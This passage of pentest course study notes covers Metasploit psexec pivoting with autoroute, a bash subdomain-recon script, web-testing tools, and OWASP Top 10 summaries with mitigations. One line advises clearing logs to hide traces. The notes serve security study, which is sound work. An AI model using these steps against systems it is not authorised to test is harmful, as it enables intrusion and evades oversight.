</code></pre><blockquote id="ee9f2269-b79f-4833-a60d-8c1525c52db6" class="">[RECAP] One machine will have dual net adapter</blockquote><blockquote id="077e3edb-fd05-48ee-9726-53f7ada78f66" class="">The second one gonna stay just in the new network - 10.10.10.0</blockquote><blockquote id="ed44be97-ffab-40eb-9798-344e49d4e625" class="">Both w10 machines will ping each other, our kali should ping just one</blockquote><h3 id="8c784e27-15b3-4350-b32c-86c5eb8a43e4" class=""><strong>Metasploit</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#metasploit-1"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="de6ef046-e940-4d8e-b47f-f6bb1404be38" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">exploit/windows/smb/psexec # enter in the machine that has 2 net adapters
route print or ipconfig # to show the network config
arp -a # to show the established connections
run autoroute -s 10.10.10.0/24
run autoroute -p # to list all active routes
background

# we can search portscan &gt; tcp or whatever
</code></pre><h3 id="404486a2-653c-49e7-8d31-8e3a7958dfcc" class=""><strong>Cleanup</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#cleanup"></a></strong></h3><p id="70cbb41f-24e5-429e-a2e6-ef55464986b7" class="">Make the system/network as it was when you entered it:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="9df58601-ed0c-43fe-b626-097f18abdb58" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- remove executables, scripts and added files
- remove malware, rootkits and added user accounts
- set settings back to original configurations
</code></pre><blockquote id="53ca239a-e881-4613-9d1c-235a3cd73376" class="">Make it look like you were never there clear logs, traces etc</blockquote><h1 id="833469d3-3676-46be-bd11-e1a795d97639" class=""><strong>Web Application</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#web-application"></a></strong></h1><p id="60fbf092-9313-45d1-b9d8-95fe33b682b7" class="">To install GO and other useful tools:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="810924ae-df6a-430d-ba65-e719fea060d6" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">https://github.com/Dewalt-arch/pimpmykali
</code></pre><h2 id="2ea25bb1-39e1-4799-8eac-377a7eef6287" class=""><strong>Web Application Enumeration</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#web-application-enumeration"></a></strong></h2><h3 id="81843d79-2746-424a-a11f-2493527a272a" class=""><strong>Assetfinder</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#assetfinder"></a></strong></h3><p id="b157bfb1-01c3-464b-936e-35df0f1b73e5" class="">To install:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="a6afda6c-9e96-4d15-a8d6-3009766a86e5" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all"># go get -u github.com/tomnomnom/assetfinder

assetfinder &lt;domain&gt;
assetfinder --subs-only &lt;domain&gt;
</code></pre><blockquote id="6df021b5-6db0-4464-953a-5a5b786aa7d7" class="">This script will sort only the subdomains that contains our target</blockquote><p id="d879496e-1ec6-4ac7-8600-0d399fe88e4d" class="">create run.sh:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="3e7934de-0f61-4f99-8b63-6c7e81ccc08e" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">#!/bin/bash

url=$1

if [ ! -d &quot;$url&quot; ]; then
  mkdir $url
fi

if [ ! -d &quot;$url/recon&quot; ]; then
  mkdir $url/recon
fi

echo &quot;[+] Harvesting subdomains with assetfinder...&quot;
assetfinder $url &gt;&gt; $url/recon/assets.txt
cat $url/recon/assets.txt | grep $1 &gt;&gt; $url/recon/final.txt
rm $url/recon/assets.txt

</code></pre><h3 id="918e893d-5a0d-4083-b8ff-78113ae03c45" class=""><strong>Amass</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#amass"></a></strong></h3><p id="c42b4e8e-882f-40e5-a04c-b14f69f73ae6" class="">https://github.com/OWASP/Amass</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="c4182978-e1bd-41ad-912b-79791fe4dae4" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all"># go get -v github.com/OWASP/Amass/v3/...

amass enum -d &lt;domain&gt;
</code></pre><p id="26a4e360-8482-4c92-9efa-174689d7583a" class="">Add to the script:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="81df7ebf-9615-46a4-ac9a-ff944eed338d" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">echo &quot;[+] Harvesting subdomains with Amass...&quot;
amass enum -d $url &gt;&gt; $url/recon/f.txt
sort -u $url/recon/f.txt &gt;&gt; $url/recon/final.txt
rm $url/recon/f.txt
</code></pre><h3 id="2d8b91c3-2f26-412c-a59a-94f3e2ee3572" class=""><strong>Httprobe</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#httprobe"></a></strong></h3><p id="6443fe7a-cbed-4585-bd48-b35be59f39e8" class="">→ https://github.com/tomnomnom/httprobe</p><p id="421ebb4c-9a07-4c0f-b0e2-5279ecfd0559" class="">It tests the list to see which one is up:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2a5121dd-81c7-4d77-9268-ddd45ba69e05" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all"># go get -u github.com/tomnomnom/httprobe

cat &lt;file of subdomains&gt; | httprobe -s -p https:443
</code></pre><p id="a79aa12f-ad1b-4e49-a6c3-9f1dd0105e06" class="">add to the script:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="9e0c440d-2798-4013-a3eb-6a6ded692828" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">echo &quot;[+] Probing for alive domains...&quot;
cat $url/recon/final.txt | sort -u | httprobe -s -p https:443 | sed &#x27;s/https\?:\/\////&#x27; | tr -d &#x27;:443&#x27; &gt;&gt; $url/recon/alive.txt
</code></pre><h3 id="0147f9b8-f0aa-4b75-8652-5da177eb0e9b" class=""><strong>GoWitness</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#gowitness"></a></strong></h3><p id="0f8ecc51-339c-4403-8d32-86e626527f1a" class="">→ https://github.com/sensepost/gowitness</p><p id="d0a9303c-3fbd-4249-b6c5-26bf3231f8d6" class="">Takes screenshot of a webpage:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="f8ed907d-0cfa-4df5-9750-f14d5e93401c" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all"># go get -u gorm.io/gorm = dependencies
# go get -u github.com/sensepost/gowitness
# gowitness single https://&lt;domain&gt;

cd screenshots/
</code></pre><h3 id="4fc95040-3910-47c7-9a4d-bccf3a893fff" class=""><strong>tcm full script for subdomain enumeration</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#tcm-full-script-for-subdomain-enumeration"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="976a1110-d3a9-4610-b120-1567e044b971" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">https://pastebin.com/MhE6zXVt
</code></pre><h3 id="c077b4a0-9777-4d60-8e33-931f44fb7509" class=""><strong>Additional Resources</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#additionalresources"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="53acc1c4-4819-44ee-9793-7a9004db4bdb" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">https://www.youtube.com/watch?v=uKWu6yhnhbQ
https://www.youtube.com/watch?v=MIujSpuDtFY&amp;list=PLKAaMVNxvLmAkqBkzFaOxqs3L66z2n8LA
</code></pre><h2 id="bbdbe589-d334-4f7c-8bf0-35194c8b1f5a" class=""><strong>Testing OWASP Top 10</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#testing-owasp-top-10"></a></strong></h2><p id="af10787e-7864-4e82-8016-a658e436fe0c" class="">https://owasp.org/Top10/</p><ul id="51b24140-9e43-4ff4-b0d1-41a491636e51" class="bulleted-list"><li style="list-style-type:disc">checklist: https://github.com/tanprathan/OWASP-Testing-Checklist</li></ul><h3 id="0748ef68-2c62-4255-9584-451027084e31" class=""><strong>Juice Shop</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#juice-shop"></a></strong></h3><p id="0e1ba299-d1ce-4799-971f-7e037f04caab" class="">its a vulnerable website made by owasp:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="258a0fdb-79cf-43e2-bdf3-f692cda997a6" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">https://github.com/juice-shop/juice-shop
https://pwning.owasp-juice.shop/
</code></pre><p id="671423e0-6d90-4803-8a03-2957112c1277" class="">We can install locally with docker or just access the thm room:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="76904c50-c072-490a-9894-ed8d6421dba6" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">https://tryhackme.com/room/owaspjuiceshop
</code></pre><h3 id="d72f0164-6f35-4df7-b748-9656aee76c42" class=""><strong>Install Foxy Proxy</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#install-foxy-proxy"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="29c6ed2c-f85f-48de-9cec-b9214526cebd" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all"># extension in firefox to change proxy easyly
https://addons.mozilla.org/pt-BR/firefox/addon/foxyproxy-standard/
</code></pre><h3 id="b822fbbc-0f92-424a-9be4-d18ca7f8029d" class=""><strong>BurpSuite</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#burpsuite"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="25da48e0-02d0-432f-92ac-130e5c743ccf" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">proxy &gt; options &gt; intercept client/server requests &gt; enable -- Is in targe scope
</code></pre><blockquote id="8cc67356-6e54-4fdf-a6d6-a1b91ffdea9c" class="">Everything else its not new. so i will pass for now, cause i used burp a lot in ctfs.</blockquote><h3 id="4430127f-6545-498b-96c4-374db8bc9c42" class=""><strong>SQL Injection</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#sql-injection"></a></strong></h3><p id="72df8f5a-4442-4475-b5e0-bee513c1cea7" class="">Is an attack in which malicious SQL statements are injected into a SQL database</p><h3 id="dfde5b84-0c4c-4758-86c0-3e73d0218669" class=""><strong>Overview</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#overview"></a></strong></h3><p id="b3ecfed4-d381-44da-a861-ffc9ea82935d" class="">SQL Verbs:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="bd7d3bd4-86df-4709-abf1-5862b550ff0f" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">SELECT, INSERT, DELETE, UPDATE, DROP, UNION
</code></pre><p id="d6486dce-f5fb-4e1a-a8cf-bb6129ba3d01" class="">Common Terms:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="496d340a-cc07-40aa-93e5-652caef44ea1" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">WHERE, AND/OR/NOT, ORDER BY
</code></pre><p id="5a393d2b-6c34-4793-87eb-ef54edcd9172" class="">Special Chars:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="f0424228-13ab-4248-9b44-1eb60e49aa03" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&#x27;  &#x27;and &quot; &quot; = string delimiters
--, /*, # = comment delimiters
*, % = wildcards
; = end sql statement
=, +,&lt;,&gt; = logic
</code></pre><h3 id="4540cf93-ffff-405c-8b62-0329dcd857e0" class=""><strong>Mitigation</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#mitigation-2"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="62f26489-4e0d-487b-b052-6c6abebed534" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- Parameterized Statements:
# Good example: &quot;SELECT * FROM users WHERE email =?&quot;;
# Bad example: &quot;SELECT * FROM users WHERE email = &#x27;+email+&#x27;&quot;;

- Sanitizing Input
</code></pre><h3 id="f2072fe4-5be6-49d3-94a6-0fe7c2ba99a7" class=""><strong>Broken Authentication</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#broken-authentication"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="7cba2497-b843-4abc-9f61-52b2e2042fb1" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Permits brute force or other automated attacks
Permits default, weak or well-known passwords
</code></pre><ul id="5213eb11-7fed-4c30-a3fd-53cdb8b17cfd" class="bulleted-list"><li style="list-style-type:disc">look for token session</li></ul><ul id="55586d68-6a12-441c-bd55-3a713130a2ba" class="bulleted-list"><li style="list-style-type:disc">default credentials</li></ul><ul id="f1e02ac3-56d0-45b0-9b4f-ecd15540793f" class="bulleted-list"><li style="list-style-type:disc">possibility to brute force</li></ul><h3 id="ebc12145-a8f9-425c-a08e-7c7db4e5655d" class=""><strong>Mitigation</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#mitigation-3"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="911df0f5-993b-4b8e-9345-854e616a5940" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- Implement MFA
- Do not ship or deploy any default credentials
- Implement weak-password checks
</code></pre><h3 id="b7ff990b-e988-4af4-8196-1907c20c9b49" class=""><strong>Sensitive Data Exposure</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#sensitive-data-exposure"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="c809d286-4f29-4658-8187-66c28ea9a69f" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">clear text data
without criptography
</code></pre><h3 id="b9a65631-e5af-4fdb-89cd-4cf93591e2cd" class=""><strong>Mitigation</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#mitigation-4"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="6f11d745-74d5-4f46-a2db-54e4bcac0f24" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- Make sure you data is encripted
- Dont share unnecessary data
- Strong passords
